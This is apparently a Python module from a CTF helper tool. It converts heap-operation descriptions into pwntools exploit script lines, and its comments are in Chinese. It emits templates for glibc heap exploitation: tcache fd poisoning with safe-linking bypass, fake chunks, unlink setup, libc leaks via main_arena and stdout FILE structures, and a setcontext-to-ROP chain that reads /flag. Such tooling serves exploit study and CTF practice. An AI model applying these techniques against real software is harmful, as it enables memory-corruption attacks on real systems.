from __future__ import annotations

from pwnbao.features.heapviz.api_profile import render_api_call
from pwnbao.features.heapviz.models import HeapApiProfile
from pwnbao.features.heapviz.operations import HeapOperation, HeapOperationKind

def generate_pwntools(operations: list[HeapOperation], api: HeapApiProfile | None = None, bits: int = 64) -> str:
    api = api or HeapApiProfile()
    bits = 32 if int(bits) == 32 else 64
    if not operations:
        return ""
    lines: list[str] = []
    for operation in operations:
        lines.extend(_operation_lines(operation, api, bits))
    return "\n".join(lines).rstrip() + "\n"


def _operation_lines(operation: HeapOperation, api: HeapApiProfile, bits: int) -> list[str]:
    pack = "p32" if bits == 32 else "p64"
    unpack = "u32" if bits == 32 else "u64"
    width = 4 if bits == 32 else 8
    if operation.kind == HeapOperationKind.ALLOC:
        data = _alloc_data(operation)
        index = _menu_index(operation)
        return [
            render_api_call(
                api.alloc_template,
                api.alloc_function,
                index=index,
                size=operation.request_size or "0x20",
                data=data,
                chunk=operation.chunk,
            ),
        ]
    if operation.kind == HeapOperationKind.FREE:
        index = _menu_index(operation)
        return [
            render_api_call(api.free_template, api.free_function, index=index, chunk=operation.chunk),
        ]
    if operation.kind == HeapOperationKind.EDIT:
        index = _menu_index(operation)
        data = operation.data.strip() or "b''"
        return [
            render_api_call(api.edit_template, api.edit_function, index=index, data=data, chunk=operation.chunk),
        ]
    if operation.kind == HeapOperationKind.SHOW:
        index = _menu_index(operation)
        result_var = operation.meta.get("result_var") or "leak"
        return [
            f"{result_var} = " + render_api_call(api.show_template, api.show_function, index=index, chunk=operation.chunk),
        ]
    if operation.kind == HeapOperationKind.DERIVE_VALUE:
        result_var = operation.meta.get("result_var") or operation.chunk or "value"
        expression = operation.meta.get("expression") or operation.value or operation.data or "0"
        return [f"{result_var} = {expression}"]
    if operation.kind == HeapOperationKind.COPY:
        source = operation.meta.get("src") or operation.target or "src"
        destination = operation.meta.get("dst") or operation.index or operation.chunk or "dst"
        length = operation.request_size or operation.meta.get("length") or "length"
        return [
            render_api_call(
                api.copy_template,
                api.copy_function,
                src=source,
                dst=destination,
                length=length,
                index=destination,
                target=source,
                size=length,
                chunk=operation.chunk,
            )
        ]
    if operation.kind == HeapOperationKind.SAFE_LINK_FD:
        return _poison_lines(operation, api, pack, safe_link=True)
    if operation.kind == HeapOperationKind.POISON_FD:
        return _poison_lines(operation, api, pack, safe_link=False)
    if operation.kind == HeapOperationKind.OVERFLOW_HEADER:
        field = operation.field or operation.meta.get("field") or "size"
        value = operation.value or operation.data or operation.meta.get("value") or "0xffffffffffffffff"
        offset = operation.meta.get("offset", "0")
        return [
            f"# 覆盖 chunk 头字段：{field} = {value}",
            f"payload = b'A' * ({offset}) + {pack}({value})",
            "# 按题目菜单写回 payload，例如："
            + render_api_call(api.edit_template, api.edit_function, index=_menu_index(operation), data="payload", chunk=operation.chunk),
        ]
    if operation.kind == HeapOperationKind.FAKE_CHUNK:
        size = operation.request_size or operation.value or "0x90"
        fd = operation.meta.get("fd", operation.fd_storage or "fake_chunk")
        bk = operation.meta.get("bk", operation.target or "fake_chunk")
        return [
            f"# 伪造 fake chunk：{operation.chunk or 'fake_chunk'} @ {operation.target or operation.meta.get('address', 'controlled_addr')}",
            f"fake_chunk  = {pack}(0)",
            f"fake_chunk += {pack}({size})",
            f"fake_chunk += {pack}({fd})",
            f"fake_chunk += {pack}({bk})",
            "# 如需对齐到真实 chunk 大小，再按题目补 b'\\x00'。",
        ]
    if operation.kind == HeapOperationKind.UNLINK_PREPARE:
        index = _menu_index(operation)
        fd = operation.fd_storage or operation.meta.get("fd") or "fake_chunk"
        bk = operation.target or operation.meta.get("bk") or "fake_chunk"
        return [
            "# 布置 fd/bk，满足 unlink 类检查",
            f"payload = {pack}({fd}) + {pack}({bk})",
            render_api_call(api.edit_template, api.edit_function, index=index, data="payload", chunk=operation.chunk),
        ]
    if operation.kind == HeapOperationKind.CONSOLIDATE:
        size = operation.request_size or "0x500"
        return [
            "# 触发 malloc_consolidate，把 fastbin 视角推向 unsorted bin",
            render_api_call(api.alloc_template, api.alloc_function, size=size, data=operation.data.strip() or "b''"),
        ]
    if operation.kind == HeapOperationKind.MALLOC_TO_TARGET:
        size = operation.request_size or "0x60"
        data = operation.data.strip() or "b''"
        return [
            f"# 预期本次 malloc 返回到目标附近：{operation.target or 'target_address'}",
            render_api_call(api.alloc_template, api.alloc_function, index=_menu_index(operation), size=size, data=data, chunk=operation.chunk, target=operation.target),
        ]
    if operation.kind == HeapOperationKind.LEAK_MAIN_ARENA:
        index = _menu_index(operation)
        main_arena = operation.value or operation.meta.get("main_arena_offset") or "main_arena_off"
        return [
            "leak = " + render_api_call(api.show_template, api.show_function, index=index, chunk=operation.chunk),
            f"leak = {unpack}(leak[:{width}].ljust({width}, b'\\x00'))",
            f"libc.address = leak - {main_arena}",
            "log.info(f'libc 基址 = {hex(libc.address)}')",
        ]
    if operation.kind == HeapOperationKind.STDOUT_ENVIRON_LEAK:
        return [
            "stdout = libc.sym['_IO_2_1_stdout_']",
            "environ = libc.sym['environ']",
            "target = stdout - 0x43",
            "# 先把 malloc 返回位置劫持到 target，再写入 FILE payload",
            "payload = b'a' * 0x33",
            "payload += flat(",
            "    0xfbad1800,",
            "    environ, environ, environ,",
            "    environ, environ + 8, environ + 8,",
            "    environ + 8, environ + 8,",
            ")",
            "# 按题目菜单写回 payload，例如："
            + render_api_call(api.edit_template, api.edit_function, index=_menu_index(operation), data="payload", chunk=operation.chunk),
        ]
    if operation.kind == HeapOperationKind.SETCONTEXT_ROP:
        setcontext_offset = operation.value or operation.meta.get("setcontext_offset") or "61"
        return [
            f"heap_frame = {operation.target or 'heap_frame'}",
            "heap_rop = heap_frame + 0x200",
            "flag = heap_frame + 0x400",
            "rop = ROP([elf, libc])",
            "rop.raw(rop.find_gadget(['ret'])[0])",
            "rop.call(libc.sym['openat'], [-100, flag, 0, 0])",
            "rop.call(libc.sym['read'], [3, flag, 0x100])",
            "rop.call(libc.sym['write'], [1, flag, 0x100])",
            "frame = flat({",
            "    0xa0: heap_rop,",
            "    0xa8: rop.find_gadget(['ret'])[0],",
            "}, filler=b'\\x00')",
            "payload = frame.ljust(0x200, b'\\x00') + rop.chain() + b'/flag\\x00'",
            f"setcontext_pivot = libc.sym['setcontext'] + {setcontext_offset}",
            "# 把 payload 写到 heap_frame",
            "# 把控制流目标改成 p64(setcontext_pivot)",
        ]
    if operation.kind == HeapOperationKind.FILL_TCACHE:
        count = max(1, int(operation.count or 7))
        size = operation.request_size or "0x20"
        start_index = _int_meta(operation, "start_index", 0)
        data = operation.data.strip() or "b''"
        lines = [f"# 填满 tcache：size {size}"]
        for index in range(count):
            lines.append(render_api_call(api.alloc_template, api.alloc_function, index=str(start_index + index), size=size, data=data))
        for index in range(count):
            lines.append(render_api_call(api.free_template, api.free_function, index=str(start_index + index)))
        return lines
    if operation.kind == HeapOperationKind.DRAIN_TCACHE:
        count = max(1, int(operation.count or 7))
        size = operation.request_size or "0x20"
        start_index = _int_meta(operation, "start_index", 0)
        data = operation.data.strip() or "b''"
        return [f"# 清空 tcache：size {size}"] + [
            render_api_call(api.alloc_template, api.alloc_function, index=str(start_index + index), size=size, data=data) + f"  # expected index {start_index + index}" for index in range(count)
        ]
    note = operation.note.strip() or "备注"
    return [f"# {note}"]


def _poison_lines(operation: HeapOperation, api: HeapApiProfile, pack: str, safe_link: bool) -> list[str]:
    index = _menu_index(operation)
    fd_storage = operation.fd_storage or "fd_storage_address"
    target = operation.target or "target_address"
    lines = [
        f"fd_storage = {fd_storage}",
        f"target = {target}",
    ]
    if safe_link:
        lines.extend([
            "encoded_fd = target ^ (fd_storage >> 12)",
            "log.info(f'编码后的 fd = {hex(encoded_fd)}')",
            render_api_call(api.edit_template, api.edit_function, index=index, data=f"{pack}(encoded_fd)"),
        ])
    else:
        lines.append(render_api_call(api.edit_template, api.edit_function, index=index, data=f"{pack}(target)"))
    return lines


def _menu_index(operation: HeapOperation) -> str:
    return operation.index.strip() if operation.index.strip() else "0"


def _alloc_data(operation: HeapOperation) -> str:
    data = (operation.data or "").strip()
    return data or "b''"


def _int_meta(operation: HeapOperation, key: str, default: int) -> int:
    try:
        return int(str(operation.meta.get(key, default)), 0)
    except (TypeError, ValueError):
        return default
